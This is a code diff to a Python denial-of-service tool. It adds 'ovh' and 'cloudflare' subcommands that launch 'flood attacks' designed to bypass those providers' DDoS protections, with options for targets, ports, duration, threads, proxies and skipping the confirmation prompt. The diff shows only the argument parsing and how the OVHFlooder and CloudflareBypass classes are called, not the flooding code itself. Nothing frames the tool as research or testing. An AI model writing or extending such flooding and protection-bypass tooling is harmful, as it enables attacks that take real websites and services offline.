@@ -17,8 +17,9 @@ from assets.methods import (
     TCPFlooder,
     HTTPFlooder,
     TOR2WebFlooder,
-    SYNFlooder  # Add this import
+    SYNFlooder
 )
+from assets.layer7 import OVHFlooder, CloudflareBypass
 
 # Target handling and validation
 class TargetManager:
@@ -325,6 +326,38 @@ def main():
     minecraft_parser.add_argument('-T', '--threads', type=int, default=5,
                            help='Number of threads per target (default: 5)')
 
+    # Add OVH parser
+    ovh_parser = subparsers.add_parser('ovh',
+        help='OVH bypass flood operation',
+        description='Launch a flood attack with OVH bypass',
+        parents=[base_parser])
+    ovh_parser.add_argument('-t', '--targets', required=True,
+                           help='Target specification (same format as UDP flood)')
+    ovh_parser.add_argument('-p', '--ports', required=False,
+                           help='Port specification (default: 80,443)')
+    ovh_parser.add_argument('-d', '--duration', type=int, default=60,
+                           help='Duration of the attack in seconds (default: 60)')
+    ovh_parser.add_argument('-T', '--threads', type=int, default=5,
+                           help='Number of threads per target (default: 5)')
+    ovh_parser.add_argument('--path', default='/',
+                           help='URL path for requests (default: /)')
+
+    # Add Cloudflare parser
+    cf_parser = subparsers.add_parser('cloudflare',
+        help='Cloudflare bypass flood operation',
+        description='Launch a flood attack with Cloudflare bypass',
+        parents=[base_parser])
+    cf_parser.add_argument('-t', '--targets', required=True,
+                           help='Target specification (same format as UDP flood)')
+    cf_parser.add_argument('-p', '--ports', required=False,
+                           help='Port specification (default: 80,443)')
+    cf_parser.add_argument('-d', '--duration', type=int, default=60,
+                           help='Duration of the attack in seconds (default: 60)')
+    cf_parser.add_argument('-T', '--threads', type=int, default=5,
+                           help='Number of threads per target (default: 5)')
+    cf_parser.add_argument('--path', default='/',
+                           help='URL path for requests (default: /)')
+
     # Parse arguments
     args = parser.parse_args()
     
@@ -469,6 +502,28 @@ def main():
                 duration=args.duration,
                 threads=args.threads,
                 debug=args.verbose,
+                skip_prompt=args.yes
+            )
+            active_flooder.start()
+        elif args.command == 'ovh':
+            active_flooder = OVHFlooder(
+                targets=targets,
+                ports=ports,
+                duration=args.duration,
+                threads=args.threads,
+                path=args.path,
+                proxy_manager=proxy_manager,
+                skip_prompt=args.yes
+            )
+            active_flooder.start()
+        elif args.command == 'cloudflare':
+            active_flooder = CloudflareBypass(
+                targets=targets,
+                ports=ports,
+                duration=args.duration,
+                threads=args.threads,
+                path=args.path,
+                proxy_manager=proxy_manager,
                 skip_prompt=args.yes
             )
             active_flooder.start()
